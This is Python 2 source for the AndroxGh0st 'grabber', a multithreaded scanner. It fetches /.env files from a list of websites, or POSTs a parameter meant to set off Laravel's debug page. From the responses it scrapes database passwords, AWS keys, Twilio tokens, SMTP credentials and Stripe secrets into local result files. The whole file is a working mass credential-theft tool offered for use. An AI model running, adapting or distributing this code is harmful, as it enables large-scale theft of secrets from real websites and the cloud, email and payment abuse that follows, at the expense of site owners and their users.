# -*- coding: utf-8 -*-
import requests, os, sys
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue

try:
	os.mkdir('Resultz')
except:
	pass

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception, e: print e
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class androxgh0st:
 	
 	def get_stripe(self, text, url):
		try:
			if "STRIPE_KEY" in text:
				if "STRIPE_KEY=" in text:
					method = '/.env'
					stripkey = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
					stripsec = reg('\nSTRIPE_SECRET=(.*?)\n', text)[0]
				elif '<td>STRIPE_KEY</td>' in text:
					method = 'debug'
					stripkey = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					stripsec = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripkey)+'\nSTRIPE_SECRET: '+str(stripsec)
				remover = str(build).replace('\r', '')
				save = open('Resultz/STRIPE.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False


	def get_db(self, text, url):
		try:
			if "DB_HOST" in text:
				if "DB_HOST=" in text:
					method = '/.env'
					dbconnec = reg('\nDB_CONNECTION=(.*?)\n', text)[0]
					dbhost = reg('\nDB_HOST=(.*?)\n', text)[0]
					dbport = reg('\nDB_PORT=(.*?)\n', text)[0]
					dbdata = reg('\nDB_DATABASE=(.*?)\n', text)[0]
					dbuser = reg('\nDB_USERNAME=(.*?)\n', text)[0]
					dbpass = reg('\nDB_PASSWORD=(.*?)\n', text)[0]
				elif '<td>DB_HOST</td>' in text:
					method = 'debug'
					dbconnec = reg('<td>DB_CONNECTION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					dbhost = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					dbport = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					dbdata = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					dbuser = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					dbpass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_CONNECTION: '+str(dbconnec)+'\nDB_HOST: '+str(dbhost)+'\nDB_PORT: '+str(dbport)+'\nDB_DATABASE: '+str(dbdata)+'\nDB_USERNAME: '+str(dbuser)+'\nDB_PASSWORD: '+str(dbpass)
				remover = str(build).replace('\r', '')
				save = open('Resultz/DATABASE.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False


	def get_twillio(self, text, url):
		try:
			if "TWILIO" in text:
				if "TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
					phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_NUMBER: '+str(phone)
				remover = str(build).replace('\r', '')
				save = open('Resultz/TWILLIO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False

	def get_smtp(self, text, url):
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				if "AWS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					awskey	 = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					awssecreet = reg("\nAWS_SECRET_ACCESS_KEY(.*?)\n", text)[0]
					awsregion = reg("\nAWS_DEFAULT_REGION(.*?)\n", text)[0]
				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					awskey   = reg('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					awssecreet = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					awsregion = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS_ACCESS_KEY_ID: '+str(awskey)+'\nAWS_SECRET_ACCESS_KEY: '+str(awssecreet)+'\nAWS_DEFAULT_REGION: '+str(awsregion)
				remover = str(build).replace('\r', '')
				save = open('Resultz/'+awsregion+'.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False

	def get_smtp1(self, text, url):
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
					mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
					mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
					mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailfrom = reg('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				if mailuser == "null" or mailpass == "null" or mailfrom == "null" or mailuser == "" or mailpass == "" or mailfrom == "":
					return False
				else:
					if '.sendgrid.net' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFORM: '+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Resultz/SENDGRID.txt', 'a')
						save.write(remover+'\n\n')
						save.close()	
					if '.mailgun.org' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFORM: '+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Resultz/MAILGUN.txt', 'a')
						save.write(remover+'\n\n')
						save.close()	

					if '.gmail.com' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFORM: '+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Resultz/GMAIL.txt', 'a')
						save.write(remover+'\n\n')
						save.close()	

					if '.zoho.com' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFORM: '+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Resultz/ZOHO.txt', 'a')
						save.write(remover+'\n\n')
						save.close()

					if '.office365.com' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFORM: '+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Resultz/OFFICE.txt', 'a')
						save.write(remover+'\n\n')
						save.close()		
							
					else:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFORM: '+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Resultz/SMTP_RANDOM.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					return True
			else:
				return False
		except Exception as err:
			print(str(err))
			return False


def printf(text):
    ''.join([str(item) for item in text])
    print(text + '\n'),

def main(url):
	resp = False
	try:
		text = '\033[32;1m[+]\033[0m '+url
		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
		if "APP_KEY=" in get_source:
			resp = get_source
		else:
			get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
			if "<td>APP_KEY</td>" in get_source:
				resp = get_source
		if resp:
			getdb = androxgh0st().get_db(resp, url)
			getsmtp = androxgh0st().get_smtp(resp, url)
			getwtilio = androxgh0st().get_twillio(resp, url)
			getsmtp1 = androxgh0st().get_smtp1(resp, url)
			getstripe = androxgh0st().get_stripe(resp, url)
			if getsmtp1:
				text += ' | \033[32;1mSMTP\033[0m'
			else:
				text += ' | \033[31;1mSMTP\033[0m'
			if getsmtp:
				text += ' | \033[32;1mAWS\033[0m'
			else:
				text += ' | \033[31;1mAWS\033[0m'
			if getwtilio:
				text += ' | \033[32;1mTWILIO\033[0m'
			else:
				text += ' | \033[31;1mTWILIO\033[0m'
			if getdb:
				text += ' | \033[32;1mDB\033[0m'
			else:
				text += ' | \033[31;1mDB\033[0m'
			if getstripe:
				text += ' | \033[32;1mSTRIPE\033[0m'
			else:
				text += ' | \033[31;1mSTRIPE\033[0m'

	except:
		text = '\033[31;1m[+]\033[0m '+url
	printf(text)


if __name__ == '__main__':
    print('''
______________________________________________________________________________________________________________


 /$$   /$$  /$$$$$$  /$$      /$$ /$$$$$$$$ /$$   /$$        /$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
| $$  /$$/ /$$__  $$| $$$    /$$$| $$_____/| $$$ | $$       /$$__  $$ /$$__  $$| $$__  $$| $$_____/| $$__  $$
| $$ /$$/ | $$  \ $$| $$$$  /$$$$| $$      | $$$$| $$      | $$  \__/| $$  \ $$| $$  \ $$| $$      | $$  \ $$
| $$$$$/  | $$$$$$$$| $$ $$/$$ $$| $$$$$   | $$ $$ $$      | $$      | $$  | $$| $$  | $$| $$$$$   | $$$$$$$/
| $$  $$  | $$__  $$| $$  $$$| $$| $$__/   | $$  $$$$      | $$      | $$  | $$| $$  | $$| $$__/   | $$__  $$
| $$\  $$ | $$  | $$| $$\  $ | $$| $$      | $$\  $$$      | $$    $$| $$  | $$| $$  | $$| $$      | $$  \ $$
| $$ \  $$| $$  | $$| $$ \/  | $$| $$$$$$$$| $$ \  $$      |  $$$$$$/|  $$$$$$/| $$$$$$$/| $$$$$$$$| $$  | $$
|__/  \__/|__/  |__/|__/     |__/|________/|__/  \__/       \______/  \______/ |_______/ |________/|__/  |__/
                                                                                                             
                                                                                                             
                                                                                                             
___________________________________SIMPLE GRABBER TWILLIO & SMTP \033[32;1m\033[0m V6.9___________________________________\n''')
    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
        tanya = raw_input("Want to contineu session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl # Send Error Biar Lanjut Ke Wxception :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = raw_input("websitelist ? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = raw_input("threads ? ")
            except:
                print("Wrong thread number!")
                exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "http://"+url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass

